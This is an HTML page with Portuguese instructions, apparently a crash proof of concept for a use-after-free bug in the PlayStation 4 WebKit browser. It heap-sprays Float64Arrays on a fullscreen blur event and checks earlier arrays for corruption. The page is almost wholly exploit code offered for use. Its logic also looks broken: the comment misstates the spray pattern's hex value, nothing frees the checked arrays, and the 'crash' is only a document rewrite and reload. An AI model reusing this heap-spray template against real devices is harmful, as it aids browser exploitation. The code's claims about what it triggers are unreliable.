<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Crash PoC</title>
</head>
<body>
    <h1>PS4 WebKit UAF - Crash Proof of Concept</h1>
    <h2 style="color:red;">‚ö†Ô∏è ATEN√á√ÉO: Este PoC VAI CRASHAR o navegador do PS4</h2>
    
    <h3>Instru√ß√µes:</h3>
    <ol>
        <li>Este teste S√ì funciona em <b>PlayStation 4 REAL</b></li>
        <li>N√ÉO funciona em PC/Mac/Emulador</li>
        <li>Clique no bot√£o abaixo</li>
        <li>Espere entrar em fullscreen</li>
        <li>Aperte o bot√£o <b>OPTIONS</b> do controle PS4</li>
        <li>Se o UAF funcionar, o navegador VAI CRASHAR em 3 segundos</li>
    </ol>
    
    <button onclick="runCrashPoC()" style="padding:20px; font-size:18px; background:red; color:white;">
        ‚ö†Ô∏è EXECUTAR CRASH POC (CRASHAR√Å O NAVEGADOR)
    </button>
    
    <hr>
    
    <div id="status" style="font-size:16px; margin-top:20px;"></div>
    
    <script>
        function log(msg, color) {
            const status = document.getElementById('status');
            status.innerHTML += '<p style="color:' + (color || 'black') + '">' + msg + '</p>';
        }
        
        function runCrashPoC() {
            log('üîÑ Iniciando Crash PoC...', 'blue');
            log('üìã Criando 5000 Float64Arrays...', 'blue');
            
            const controllers = [];
            const PATTERN = 2.121995791e-314; // 0x4141414141414141
            
            for(let i = 0; i < 5000; i++) {
                const arr = new Float64Array(8);
                arr[0] = i;
                controllers.push(arr);
            }
            
            log('‚úÖ Arrays criados. Entrando em fullscreen...', 'green');
            log('‚ö†Ô∏è APERTE O BOT√ÉO OPTIONS DO CONTROLE AGORA!', 'red');
            
            const elem = document.documentElement;
            if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else {
                log('‚ùå ERRO: webkitRequestFullscreen n√£o dispon√≠vel', 'red');
                log('‚ùå Voc√™ N√ÉO est√° em um PS4!', 'red');
                return;
            }
            
            window.onblur = function() {
                log('üéØ BLUR DETECTADO! Executando spray...', 'orange');
                
                const spray = [];
                for(let i = 0; i < 8000; i++) {
                    const p = new Float64Array(10);
                    p.fill(PATTERN);
                    spray.push(p);
                }
                
                log('üîç Verificando corrup√ß√£o...', 'blue');
                
                let corrupted = null;
                let corruptedIndex = -1;
                
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === PATTERN) {
                        corrupted = controllers[i];
                        corruptedIndex = i;
                        break;
                    }
                }
                
                if (corrupted) {
                    log('‚úÖ UAF CONFIRMADO! Controller[' + corruptedIndex + '] corrompido!', 'green');
                    log('üí• CRASH EM 3 SEGUNDOS...', 'red');
                    
                    setTimeout(function() {
                        log('üí£ Triggering crash sequence...', 'red');
                        
                        // Sequ√™ncia exata do report que causa crash
                        document.open();
                        document.write('<html><body><h1>Crash Triggered</h1></body></html>');
                        document.close();
                        
                        setTimeout(function() {
                            location.reload();
                        }, 500);
                        
                    }, 3000);
                    
                } else {
                    log('‚ùå UAF N√ÉO DETECTADO', 'red');
                    log('üìä Diagn√≥stico:', 'orange');
                    log('Poss√≠veis causas:', 'orange');
                    log('1. Voc√™ N√ÉO est√° em um PS4 real', 'orange');
                    log('2. Firmware do PS4 >= 10.00 (bug corrigido)', 'orange');
                    log('3. Timing incorreto (tente apertar OPTIONS mais r√°pido/devagar)', 'orange');
                    
                    // Mostra primeiros valores para debug
                    log('Valores dos primeiros controllers:', 'blue');
                    for(let i = 0; i < Math.min(5, controllers.length); i++) {
                        const buf = new ArrayBuffer(8);
                        new Float64Array(buf)[0] = controllers[i][0];
                        const hex = new BigUint64Array(buf)[0].toString(16);
                        log('  controllers[' + i + '][0] = 0x' + hex, 'blue');
                    }
                }
            };
        }
    </script>
</body>
</html>
